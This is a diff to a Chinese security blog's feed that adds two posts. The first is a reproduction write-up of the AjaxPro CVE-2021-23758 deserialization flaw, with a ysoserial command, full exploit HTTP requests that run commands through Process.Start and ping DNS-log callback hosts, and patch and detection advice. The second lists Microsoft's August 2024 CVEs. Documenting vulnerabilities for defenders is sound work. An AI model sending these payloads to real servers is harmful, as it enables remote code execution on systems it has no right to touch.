@@ -10,9 +10,274 @@
         </author>
         <description>赌徒去往哪儿里，那里就是赌场。</description>
         <language>zh-HK</language>
-        <pubDate>Thu, 15 Aug 2024 10:32:48 +0800</pubDate>
-        <lastBuildDate>Thu, 15 Aug 2024 10:32:48 +0800</lastBuildDate>
+        <pubDate>Fri, 16 Aug 2024 15:56:46 +0800</pubDate>
+        <lastBuildDate>Fri, 16 Aug 2024 15:56:46 +0800</lastBuildDate>
         <category term="CygneNoir" />
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/16/Internet%20Security/Ajaxpro2.CVE-2021-23758.Remote.Code.Execution%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+            <title>Ajaxpro2.CVE-2021-23758.Remote.Code.Execution 远程代码执行漏洞</title>
+            <link>http://example.com/2024/08/16/Internet%20Security/Ajaxpro2.CVE-2021-23758.Remote.Code.Execution%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+            <category term="Internet Security" scheme="http://example.com/categories/Internet-Security/" />
+            <category term="Ajaxpro2" scheme="http://example.com/tags/Ajaxpro2/" />
+            <category term="CVE" scheme="http://example.com/tags/CVE/" />
+            <pubDate>Fri, 16 Aug 2024 15:56:46 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;H3C&#34; style=&#34;--block-color:#c6847d;&#34;&gt;&lt;a href=&#34;https://www.h3c.com/cn/d_202112/1519681_30003_0.htm&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/16/kEgxb2AdaS6pFHe.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://www.h3c.com/cn/d_202112/1519681_30003_0.htm&#34; class=&#34;title&#34;&gt;AjaxPro.NET 反序列化漏洞(CVE-2021-23758)&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;Ajax.NET Professional (AjaxPro)是最先把 AJAX 技术应用在微软.NET 环境下框架之一，具有部署简单、使用方便、运行高效等特点； 该框架能够创建一个代理类且可以使客户端的 JS 代码实现调用服务端的方法，并能返回各种在.NET 里使用的类型；使用该框架和直接使用.NET 基本无差别。近日，新华三攻防实验室威胁预警团队监测到网上爆发了 AjaxPro.NET 反序列化漏洞 (CVE-2021-23758)，成功利用此漏洞可以在受害主机上执行任意代码，本团队对该漏洞进行了复现和分析。&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;奇安信&#34; style=&#34;--block-color:#c6847d;&#34;&gt;&lt;a href=&#34;https://blog.csdn.net/smellycat000/article/details/122593095&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/16/FDi1KyTSarMQCIw.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://blog.csdn.net/smellycat000/article/details/122593095&#34; class=&#34;title&#34;&gt;详细分析开源软件项目 Ajax.NET Professional 中的 RCE 漏洞（CVE-2021-23758）&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;2021 年秋，MOGWAI LABS 实验室在为客户进行渗透测试过程中发现了开源组件 “Ajax.NET Professional” 中的一个反序列化漏洞 (CVE-2021-23758)，如下是对漏洞的详细分析。&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;低调求绕过,没事写博客&#34; style=&#34;--block-color:#c6847d;&#34;&gt;&lt;a href=&#34;https://blog.csdn.net/qq_35013491/article/details/137078252&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/16/bUKc1esVrgya6pw.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://blog.csdn.net/qq_35013491/article/details/137078252&#34; class=&#34;title&#34;&gt;ajaxpro CVE-2021-23758 漏洞记录&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;在 ASP.NET 站点中使用 Ajaxpro 组件时发现的安全漏洞 CVE-2021-23758，攻击者可通过构造恶意 payload 执行远程代码执行(RCE)，展示了如何利用 ObjectDataProvider 和 ProcessStartInfo 进行攻击。&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;vuldb&#34; style=&#34;--block-color:#c6847d;&#34;&gt;&lt;a href=&#34;https://vuldb.com/zh/?id.187524&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/16/2ya4GHrgL6EZKM1.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://vuldb.com/zh/?id.187524&#34; class=&#34;title&#34;&gt;AJAXPRO CVE-2021-23758&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;https://vuldb.com/zh/?id.187524&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;cve&#34; style=&#34;--block-color:#c6847d;&#34;&gt;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-23758&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/16/hTf9tqlHGYekgSJ.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-23758&#34; class=&#34;title&#34;&gt;CVE-2021-23758&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;https://www.cve.org/CVERecord?id=CVE-2021-23758&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;h1 id=&#34;x00-漏洞概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x00-漏洞概述&#34;&gt;#&lt;/a&gt; x00 漏洞概述&lt;/h1&gt;
+&lt;p&gt;2021 年秋，MOGWAI LABS 实验室在为客户进行渗透测试过程中发现了开源组件 “&lt;a href=&#34;http://Ajax.NET&#34;&gt;Ajax.NET&lt;/a&gt; Professional” 中的一个反序列化漏洞 (CVE-2021-23758)，如下是对漏洞的详细分析。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://Ajax.NET&#34;&gt;Ajax.NET&lt;/a&gt; Professional 简介&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://Ajax.NET&#34;&gt;Ajax.NET&lt;/a&gt; Professional 是一个开源软件项目，在二零零几年时非常流行，现在仍然可以找到基于该框架的应用程序。GitHub 官方库对它的描述为，“&lt;a href=&#34;http://Ajax.NET&#34;&gt;Ajax.NET&lt;/a&gt; Professional (AjaxPro) 是微软 &lt;a href=&#34;http://ASP.NET&#34;&gt;ASP.NET&lt;/a&gt; 的首批 AJAX 框架之一。该框架将创建 JavaScript 代理类用于客户端上，以调用 web 服务器上的方法，在所有常见 web 浏览器（包括移动设备在内）上具有完整的数据类型支持。返回自己的类、结构、数据集、枚举等等，就如直接在 .NET 中所作的那样。”&lt;/p&gt;
+&lt;p&gt;“完整的数据类型支持” 和 “自己的类 “这类短语总是引起我们的注意，因为它们意味着序列化 / 反序列化流程非常灵活，随后我们将详细讨论这一问题。&lt;/p&gt;
+&lt;h1 id=&#34;x01-影响范围&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x01-影响范围&#34;&gt;#&lt;/a&gt; x01 影响范围&lt;/h1&gt;
+&lt;p&gt;package AjaxPro.2 &amp;lt; v21.12.8.1&lt;/p&gt;
+&lt;h1 id=&#34;x02-复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x02-复现&#34;&gt;#&lt;/a&gt; x02 复现&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;一般出现在 &lt;a href=&#34;http://asp.net&#34;&gt;asp.net&lt;/a&gt; 的站点&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;打开页面，源代码会看到 类似 /ajaxpro/gust_search,wlms.ashx 路径&lt;br /&gt;
+如果有源代码的话，copy aspx all.txt&lt;br /&gt;
+ 去掉分号中间空格批量请求。&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;ajaxpro 组件存在 CVE-2021-23758 漏洞，标有属性 &lt;code&gt;[AjaxPro.AjaxMethod]&lt;/code&gt;  或 &lt;code&gt;[AjaxMethod]&lt;/code&gt; ，并且接收 object 类型参数的方法能够 rce&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;搜索 public &amp;amp; object&lt;/p&gt;
+&lt;p&gt;obj 对应 object 后的参数&lt;br /&gt;
+ X-Ajaxpro-Method 对应 object 前的类，如果带 method 就不需要了&lt;/p&gt;
+&lt;p&gt;生成 payload 替换下面列表&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ysoserial.exe -g objectdataprovider -f JavaScriptSerializer -c &#34;ping dnslog&#34; -o raw&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST /ajaxpro/gust_search,ppms.ashx?method=Ajaxpro HTTP/2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Host: 127.0.0.1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Cookie: ASP.NET_SessionId=pvht0n45im23adqck1mlurap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Length: 584&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Sec-Ch-Ua: &#34; Not A;Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;96&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;X-Ajaxpro-Method: Ajaxpro&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Type: text/plain; charset=UTF-8&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Sec-Ch-Ua-Mobile: ?0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Sec-Ch-Ua-Platform: &#34;Windows&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept: */*&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Origin: https://localhost:44375&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Sec-Fetch-Site: same-origin&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Sec-Fetch-Mode: cors&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Sec-Fetch-Dest: empty&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Referer: https://localhost:44375/demo&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Encoding: gzip, deflate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;#123;&#34;obj&#34;:&amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &#34;__type&#34;:&#34;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &#34;MethodName&#34;:&#34;Start&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &#34;ObjectInstance&#34;:&amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &#34;__type&#34;:&#34;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &#34;StartInfo&#34;: &amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &#34;__type&#34;:&#34;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &#34;FileName&#34;:&#34;cmd&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &#34;Arguments&#34;:&#34;/c ping 123.dnslog.cn&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;#125;&amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST /ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore/;/login HTTP/1.1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;X-Ajaxpro-Method: GetStoreWarehouseByStore&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Host: 192.168.37.168:8080&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Connection: close&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-type: application/x-www-form-urlencoded&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Length: 604&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &#34;storeID&#34;:&amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &#34;__type&#34;:&#34;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &#34;MethodName&#34;:&#34;Start&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &#34;ObjectInstance&#34;:&amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &#34;__type&#34;:&#34;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &#34;StartInfo&#34;: &amp;#123;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &#34;__type&#34;:&#34;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;,&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &#34;FileName&#34;:&#34;cmd&#34;, &#34;Arguments&#34;:&#34;/c ping d4e5b59b8a.ipv6.1433.eu.org.&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;#125;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;x03-漏洞背景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x03-漏洞背景&#34;&gt;#&lt;/a&gt; x03 漏洞背景&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;http://Ajax.NET&#34;&gt;Ajax.NET&lt;/a&gt; Professional (AjaxPro) 是最先把 AJAX &lt;a href=&#34;http://xn--3dsp6ohyap6fk5hipxq75b.NET&#34;&gt;技术应用在微软.NET&lt;/a&gt; 环境下框架之一，具有部署简单、使用方便、运行高效等特点； 该框架能够创建一个代理类且可以使客户端的 JS 代码实现调用服务端的方法，&lt;a href=&#34;http://xn--4pr39dng30y6t9am9i28z.NET&#34;&gt;并能返回各种在.NET&lt;/a&gt; 里使用的类型；&lt;a href=&#34;http://xn--2rqa299az1sxyexyau37dfa152bv92e.NET&#34;&gt;使用该框架和直接使用.NET&lt;/a&gt; 基本无差别。近日，新华三攻防实验室威胁预警团队监测到网上爆发了 &lt;a href=&#34;http://AjaxPro.NET&#34;&gt;AjaxPro.NET&lt;/a&gt; 反序列化漏洞 (CVE-2021-23758)，成功利用此漏洞可以在受害主机上执行任意代码，本团队对该漏洞进行了复现和分析。&lt;/p&gt;
+&lt;h1 id=&#34;x04-漏洞原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x04-漏洞原理&#34;&gt;#&lt;/a&gt; x04 漏洞原理&lt;/h1&gt;
+&lt;p&gt;该漏洞是由于 AjaxPro &lt;a href=&#34;http://xn--5nqv40brwlcyp.NET&#34;&gt;开源组件.NET&lt;/a&gt; Class Handler 存在对输入数据限制检查不严格引起的；该 AjaxPro 框架在 JavaScriptDeserializer.DeserializeFromJson 函数反序列化过程中，如果通过 &lt;code&gt;__type&lt;/code&gt;  获取的 &lt;code&gt;Type&lt;/code&gt;  对象且可对其 &lt;code&gt;Type&lt;/code&gt;  对象修改，攻击者可利用该漏洞在目标主机上执行任意代码。&lt;/p&gt;
+&lt;h1 id=&#34;x05-修复方案&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x05-修复方案&#34;&gt;#&lt;/a&gt; x05 修复方案&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;目前官方已发布最新版本，请受影响用户尽快更新。&lt;br /&gt;
+&lt;a href=&#34;https://github.com/michaelschwarz/Ajax.NETProfessional/releases/tag/v21.12.8.1&#34;&gt;https://github.com/michaelschwarz/Ajax.NETProfessional/releases/tag/v21.12.8.1&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;新华三解决方案&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;新华三安全设备防护方案&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;新华三 IPS 规则库将在 1.0.161 版本支持对该漏洞的识别，新华三全系安全产品可通过升级 IPS 特征库识别该漏洞的攻击流量，并进行主动拦截。。&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;新华三态势感知解决方案&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;新华三态势感知已支持该漏洞的检测，通过信息搜集整合、数据关联分析等综合研判手段，发现网络中遭受该漏洞攻击及失陷的资产。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;新华三云安全能力中心解决方案&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;新华三云安全能力中心知识库已更新该漏洞信息，可查询对应漏洞产生原理、升级补丁、修复措施等。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/16/Internet%20Security/Microsoft%20August%202024%20CVE/</guid>
+            <title>Microsoft August 2024 CVE</title>
+            <link>http://example.com/2024/08/16/Internet%20Security/Microsoft%20August%202024%20CVE/</link>
+            <category term="Internet Security" scheme="http://example.com/categories/Internet-Security/" />
+            <category term="Internet Security" scheme="http://example.com/tags/Internet-Security/" />
+            <category term="August 2024 CVE" scheme="http://example.com/tags/August-2024-CVE/" />
+            <pubDate>Fri, 16 Aug 2024 15:42:59 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Microsoft&#34; style=&#34;--block-color:#0e4775;&#34;&gt;&lt;a href=&#34;https://msrc.microsoft.com/update-guide/&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/16/sgVvmW1RXSiaxe2.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://msrc.microsoft.com/update-guide/&#34; class=&#34;title&#34;&gt;Security Update Guide&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;Microsoft Security Update Guide&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The six actively zero-day vulnerabilities：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2024-38178 - Scripting Engine Memory Corruption Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-38193 - Windows Ancillary Function Driver for WinSock Elevation of Privilege Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-38213 - Windows Mark of the Web Security Feature Bypass Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-38106 - Windows Kernel Elevation of Privilege Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-38107 - Windows Power Dependency Coordinator Elevation of Privilege Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-38189 - Microsoft Project Remote Code Execution Vulnerability&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;The four publicly disclosed vulnerabilities：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2024-38199 - Windows Line Printer Daemon (LPD) Service Remote Code Execution Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-21302 - Windows Secure Kernel Mode Elevation of Privilege Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-38200 - Microsoft Office Spoofing Vulnerability&lt;/li&gt;
+&lt;li&gt;CVE-2024-38202 - Windows Update Stack Elevation of Privilege Vulnerability&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;The 89 vulnerabilities：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;36 Elevation of Privilege Vulnerabilities&lt;/li&gt;
+&lt;li&gt;4 Security Feature Bypass Vulnerabilities&lt;/li&gt;
+&lt;li&gt;28 Remote Code Execution Vulnerabilities&lt;/li&gt;
+&lt;li&gt;8 Information Disclosure Vulnerabilities&lt;/li&gt;
+&lt;li&gt;6 Denial of Service Vulnerabilities&lt;/li&gt;
+&lt;li&gt;7 Spoofing Vulnerabilities&lt;/li&gt;
+&lt;/ul&gt;
